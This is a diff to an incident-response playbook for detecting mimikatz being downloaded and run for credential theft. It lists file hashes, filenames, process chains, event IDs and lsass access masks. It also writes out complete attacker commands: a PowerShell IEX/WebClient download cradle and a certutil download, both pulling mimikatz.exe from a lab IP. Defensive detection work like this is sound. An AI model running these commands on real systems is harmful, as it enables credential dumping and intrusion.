@@ -33,45 +33,65 @@ Sub-techniques depending on method:
 Purpose: Provide a structured response workflow for detecting and responding to downloading and executing mimikatz for Credential Access.
 
 # Indicators of Compromise (IOCs)
-1. Process Creation (Sysmon Event ID 1, Win Event ID 4688)
+1. File Hashes (Mimikatz Variants)
+   MD5: E930B05EFE23891D19BC354A4209BE3E
 
-- cmd.exe, powershell.exe, or LOL used to spawn powershell.exe
+3. Filenames
 
-- PowerShell execution with flags:
+- mimikatz.exe
 
-    -Invoke-WebRequest
+- Dropped temp names like:
 
-    -System.Net.WebClient
+
+    - C:\Users\labadmin\mimikatz.exe
+
+3. Process Indicators (Event ID 1 / 4688)
+
+- Parent/Child chain:
+
+    - cmd.exe → powershell.exe → mimikatz.exe
 
 - Suspicious command-line usage:
 
-    - Invoke-WebRequest (IWR)
-    - Invoke-Expression (IEX)
-    - certutil.exe
-    - mimikatz.exe
-  
+    - `powershell -nop -exec bypass -c "IEX (New-Object Net.WebClient).DownloadString("http://192.168.1.105:8080/mimikatz.exe")"`
 
+    - `certutil.exe -urlcache -split -f http://192.168.1.105:8080/mimikatz.exe mimikatz.exe`
 
-2. Network Connections (Sysmon Event ID 3)
+4. Network Indicators (Event ID 3)
 
-- Outbound connections to external IPs/domains not in baseline - 192.168.1.105:8080
+- Download server (lab/demo example):
 
-- Traffic to rare domains (e.g., dynamic DNS, free hosting)
+    - 192.168.1.105:8080
 
-- Use of non-standard ports for HTTP/HTTPS (e.g., 8080, 8443)
+Real-world examples:
 
+pastebin[.]com/raw/<id> (common for PowerShell dropper hosting)
 
-3. Script Contents (PowerShell ScriptBlock Logging, Event ID 4104)
-- Downloader behavior:
-    -Invoke-WebRequest fetching Mimikatz.exe
+Dynamic DNS services: abc123.no-ip[.]org
 
-4. File Creation (Sysmon Event ID 11)
+5. Registry & Script Indicators
 
-- Dropped Mimikatz.exe to admin account
-- Random or suspicious filenames (e.g., Mimikatz.exe)
+- PowerShell Event ID 4104:
 
-5. ProcessAccess (Sysmon Event ID 10)
+    - System.Net.WebClient.DownloadFile
 
+    - Invoke-WebRequest http://192.168.1.105:8080/mimikatz.exe
+
+    - Base64-encoded payloads in PowerShell scriptblocks.
+
+6. Process Access (Event ID 10)
+
+- SourceImage:
+
+    - C:\Users\labadmin\mimikatz.exe
+
+- TargetImage:
+
+    - C:\Windows\System32\lsass.exe
+
+- GrantedAccess:
+
+    0x1010, 0x1410 (typical for memory dump attempts).
 
 # Detection
 
